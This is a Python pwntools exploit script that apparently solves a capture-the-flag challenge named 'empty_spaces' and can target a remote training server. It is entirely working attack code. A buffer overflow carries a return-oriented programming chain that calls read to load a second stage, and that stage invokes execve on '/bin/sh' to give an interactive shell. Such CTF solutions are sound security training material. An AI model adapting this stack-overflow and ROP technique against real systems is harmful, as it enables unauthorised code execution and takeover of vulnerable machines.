from pwn import *
import angr, angrop

CHALL_PATH = "./empty_spaces"
CHALL = ELF(CHALL_PATH)

if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./empty_spaces")
        gdb.attach(c, """
        b* 0x4019a3
        """ )
        input("wait")
    elif(sys.argv[1] == '-r'):
        c = remote("empty-spaces.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./empty_spaces")

sys = 0x40ba76 # syscall; ret;
pop_rax = 0x42146b # pop rax; ret;
pop_rsi = 0x477d3d # pop rsi; ret;
pop_rdi = 0x4787b3 # pop rdi; ret;
pop_rdx = 0x4447d5 # pop rdx; bsf eax, eax; add rax, rdi; vzeroupper; ret;
nop = 0x40181f # nop; ret;
add_rax_rsi = 0x4552ef # je 0x552f7; bsr eax, eax; add rax, rsi; ret;
mov_rdi_rax = 0x404be6 # mov rdi, rax; cmp rdx, rcx; jae 0x4bd0; mov rax, rsi; ret;

#rsi already contains the address of buffer
read_chain = b''
read_chain += p64(pop_rdx) #rdx = number of bytes to read
read_chain += p64(0x100)
read_chain += p64(pop_rdi) #rdi = file descriptor, stdin
read_chain += p64(0x00)
read_chain += p64(pop_rax) #number of read syscall
read_chain += p64(0x00)
read_chain += p64(sys)

bin_sh = "/bin/sh\x00"
bin_sh = bytes(bin_sh, 'utf-8')

binsh_chain = b""
binsh_chain += bin_sh
#nopsled
binsh_chain += p64(nop)
binsh_chain += p64(nop)
binsh_chain += p64(nop)
binsh_chain += p64(nop)
binsh_chain += p64(nop)
binsh_chain += p64(nop)
binsh_chain += p64(nop)
binsh_chain += p64(nop)
binsh_chain += p64(nop)
binsh_chain += p64(nop)
binsh_chain += p64(nop)
binsh_chain += p64(nop)
binsh_chain += p64(nop)
binsh_chain += p64(nop)
binsh_chain += p64(nop)
binsh_chain += p64(nop)
binsh_chain += p64(nop)
binsh_chain += p64(nop)

binsh_chain += p64(pop_rax) #clear rax since I will add into it rsi
binsh_chain += p64(0x00)
binsh_chain += p64(add_rax_rsi) #move rsi into rax, since rsi contains the address of buffer
binsh_chain += p64(mov_rdi_rax) #move rax into rdi, now rdi contains the address of buffer
binsh_chain += p64(pop_rdx) 
binsh_chain += p64(0x00)
binsh_chain += p64(pop_rsi)
binsh_chain += p64(0x00)
binsh_chain += p64(pop_rax) #number of excve syscall
binsh_chain += p64(0x3b)
binsh_chain += p64(sys)

#payload = cyclic(500), used to find the return address at first
payload = b'0'*72
payload += read_chain
c.sendline(payload)
c.sendline(binsh_chain)

c.interactive()
